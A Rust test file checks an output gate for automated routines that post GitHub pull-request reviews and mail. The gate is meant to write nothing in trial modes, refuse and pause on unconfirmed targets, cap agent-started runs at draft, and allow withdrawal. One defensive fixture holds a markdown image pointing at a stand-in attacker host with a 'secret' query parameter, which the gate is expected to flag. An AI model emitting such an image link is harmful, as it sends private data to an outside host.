//! The gate over the real store: show-only and trial write nothing, an
//! unconfirmed target refuses and pauses, caps hold a result as a draft,
//! Freedom queues deliveries, and a held result is taken back.

use std::sync::Arc;

use eos_contracts::{ActionClass, Freedom, Part, Recipient, ResultDoc};
use eos_core::Clock;
use eos_core::delivery::{ChannelTraits, Idempotency, Undo};
use eos_core::routine::{GateDecision, GateInput, GateMode, RoutineControl, RunGate};
use eos_domain::run_scope::Trust;
use eos_inbox::gate::Gate;
use eos_testkit::{ControlCall, FakeChannels};
use serde_json::{Value, json};

use crate::rig::Rig;

pub(crate) fn review_traits(class: ActionClass) -> ChannelTraits {
    ChannelTraits { class, idempotency: Idempotency::Marker, undo: Undo::Partial, undo_window_ms: 0, max_bytes: 65_536 }
}

pub(crate) struct Gated {
    pub(crate) rig: Rig,
    pub(crate) gate: Arc<Gate>,
    pub(crate) channels: FakeChannels,
    _control: Arc<dyn RoutineControl>,
}

impl Gated {
    pub(crate) fn new() -> Self {
        let rig = Rig::new();
        let channels = FakeChannels::new().with("github", review_traits(ActionClass::Speak));
        let gate = Arc::new(Gate::new(Arc::new(channels.clone()), rig.zone.clone(), rig.clock.clone()));
        let control: Arc<dyn RoutineControl> = rig.control.clone();
        gate.attach(&control);
        rig.temp.exec(
            "INSERT INTO runs (id, routine_id, kind, origin, input, state, priority, device, cost_usd, headline, \
             created_at, updated_at) VALUES ('rn-1', 'rt-1', 'standing', 'hand', '{}', 'checking', 0, 'mac-1', 0.42, \
             'Two comments on #482', 1, 1)",
        );
        Self { rig, gate, channels, _control: control }
    }

    pub(crate) async fn apply(&self, input: GateInput) -> GateDecision {
        let (gate, ids, now) = (self.gate.clone(), self.rig.ids.clone(), self.rig.clock.now_ms());
        self.rig
            .temp
            .port()
            .write(move |tx, out| gate.apply_in(tx, out, now, ids.as_ref(), &input))
            .await
            .expect("the gate decides")
    }

    pub(crate) fn rows(&self) -> i64 {
        self.rig.temp.count("SELECT COUNT(*) FROM inbox_deliveries")
    }

    pub(crate) fn items(&self) -> i64 {
        self.rig.temp.count("SELECT COUNT(*) FROM inbox_items")
    }
}

fn pull_request() -> Recipient {
    serde_json::from_value(json!({"id": "pr", "kind": "item_place", "channel": "github",
                                  "bound": {"fact": "repo", "in": ["acme/game"]}}))
    .expect("a recipient")
}

fn freedom(rung: &str) -> Freedom {
    serde_json::from_value(json!({"rung": rung})).expect("a freedom")
}

pub(crate) fn review(text: &str) -> ResultDoc {
    let part = |key: &str, role: &str, text: &str| Part {
        key: key.into(),
        role: role.into(),
        text: text.into(),
        meta: Default::default(),
    };
    ResultDoc {
        kind: "github.review".into(),
        channel: "github".into(),
        action: "post_review".into(),
        parts: vec![part("event", "event", "COMMENT"), part("summary", "summary", text)],
    }
}

/// A PR Review result for the pull request `acme/game#482`, at `rung`.
pub(crate) fn input(rung: &str) -> GateInput {
    GateInput {
        run_id: "rn-1".into(),
        routine_id: "rt-1".into(),
        version: "rv-1".into(),
        origin: "hand".into(),
        result_mode: GateMode::AsUsual,
        doc: review("Looks good."),
        targets: vec![pull_request()],
        item_facts: json!({"kind": "github.pull_request", "key": "github:pr:acme/game#482@abc", "repo": "acme/game",
                           "untrusted": true}),
        subject_key: Some("github:pr:acme/game#482".into()),
        trust: Trust::Untrusted,
        freedom_confirmed: Some(freedom(rung)),
        goes_to_confirmed: vec![pull_request()],
    }
}

fn held(decision: &GateDecision) -> String {
    match decision {
        GateDecision::Held { item_id } => item_id.clone(),
        other => panic!("not held: {other:?}"),
    }
}

#[tokio::test]
async fn show_only_and_trial_results_write_no_row() {
    let gated = Gated::new();
    for mode in [GateMode::ShowOnly, GateMode::Trial] {
        let decision = gated.apply(GateInput { result_mode: mode, ..input("on_its_own") }).await;
        assert_eq!(decision, GateDecision::Shown);
    }
    assert_eq!((gated.rows(), gated.items()), (0, 0));
    assert!(gated.channels.sent().is_empty());
}

#[tokio::test]
async fn a_target_outside_the_confirmed_goes_to_refuses_alerts_and_pauses() {
    let gated = Gated::new();
    let decision = gated.apply(GateInput { goes_to_confirmed: Vec::new(), ..input("on_its_own") }).await;
    assert_eq!(decision, GateDecision::Refused);
    assert_eq!(gated.rows(), 0);
    let paused = ControlCall::Pause { routine_id: "rt-1".into(), reason: "target_refused".into() };
    assert_eq!(gated.rig.control.calls(), [paused]);
    let alerts = gated.rig.temp.count("SELECT COUNT(*) FROM inbox_items WHERE kind = 'routine_alert'");
    assert_eq!(alerts, 1);
}

#[tokio::test]
async fn a_run_an_agent_started_is_capped_at_draft() {
    let gated = Gated::new();
    let decision = gated.apply(GateInput { origin: "agent".into(), ..input("on_its_own") }).await;
    held(&decision);
    assert_eq!(gated.rows(), 0);
}

#[tokio::test]
async fn a_flagged_result_is_held_with_its_flags() {
    let gated = Gated::new();
    let doc = review("See ![x](https://evil.io/pixel.png?d=secret).");
    let item_id = held(&gated.apply(GateInput { doc, ..input("on_its_own") }).await);
    let item = gated.rig.find(&item_id).await;
    let payload: Value = serde_json::from_str(&item.payload).expect("json");
    assert_eq!(payload["flags"], json!(["new_host", "image"]));
    assert_eq!(gated.rows(), 0);
}

#[tokio::test]
async fn at_draft_the_result_is_held_as_a_draft_item_with_its_cost_and_verdict() {
    let gated = Gated::new();
    gated.rig.temp.exec(
        "INSERT INTO run_results (run_id, attempt, kind, headline, body, created_at, verdict) VALUES \
         ('rn-1', 1, 'github.review', 'h', '{}', 1, '{\"pass\":true}')",
    );
    let item_id = held(&gated.apply(input("draft")).await);
    let item = gated.rig.find(&item_id).await;
    assert_eq!((item.kind.as_str(), item.title.as_str()), ("draft", "Two comments on #482"));
    assert_eq!(item.subject_key.as_deref(), Some("github:pr:acme/game#482"));
    let payload: Value = serde_json::from_str(&item.payload).expect("json");
    assert_eq!(payload["doc"], serde_json::to_value(review("Looks good.")).expect("json"));
    assert_eq!((&payload["costUsd"], &payload["verdict"]), (&json!(0.42), &json!({"pass": true})));
    assert_eq!(gated.rows(), 0, "nothing is queued while it waits");
}

#[tokio::test]
async fn a_held_mail_names_each_recipient_readably() {
    let gated = Gated::new();
    let digest: Recipient = serde_json::from_value(json!({"id": "boss", "kind": "fixed", "channel": "mail",
                                                         "address": "boss@acme.dev"}))
    .expect("a recipient");
    let paragraph =
        Part { key: "p:1".into(), role: "paragraph".into(), text: "Hello.".into(), meta: Default::default() };
    let doc = ResultDoc { kind: "mail".into(), channel: "mail".into(), action: "send".into(), parts: vec![paragraph] };
    let mail = GateInput { doc, targets: vec![digest.clone()], goes_to_confirmed: vec![digest], ..input("draft") };
    let item = gated.rig.find(&held(&gated.apply(mail).await)).await;
    let payload: Value = serde_json::from_str(&item.payload).expect("json");
    let to = payload["doc"]["parts"].as_array().and_then(|parts| parts.iter().find(|p| p["key"] == "to:boss").cloned());
    assert_eq!(to.map(|part| part["text"].clone()), Some(json!("boss@acme.dev")));
}

#[tokio::test]
async fn freedom_to_send_queues_one_delivery_per_target_and_a_held_draft_can_be_withdrawn() {
    let gated = Gated::new();
    let decision = gated.apply(input("on_its_own")).await;
    let GateDecision::Delivering { delivery_ids } = decision else { panic!("not delivering: {decision:?}") };
    assert_eq!(delivery_ids.len(), 1);
    let id = delivery_ids[0].clone();
    let row = gated.rig.temp.port().read(move |tx| tx.inbox_deliveries().find(&id)).await.expect("reads");
    let row = row.expect("a row");
    assert_eq!((row.state.as_str(), row.mode.as_str(), row.target_ref.as_str()), ("queued", "auto", "pr"));
    assert_eq!(row.send_at, Some(gated.rig.clock.now_ms()), "a review can be taken back: no hold");
    assert!(row.target.contains("github:pr:acme/game#482"));

    let item_id = held(&gated.apply(input("draft")).await);
    let gate = gated.gate.clone();
    gated.rig.temp.port().write(move |tx, out| gate.withdraw_in(tx, out, "rn-1")).await.expect("withdraws");
    assert_eq!(gated.rig.find(&item_id).await.state.as_str(), "withdrawn");
}
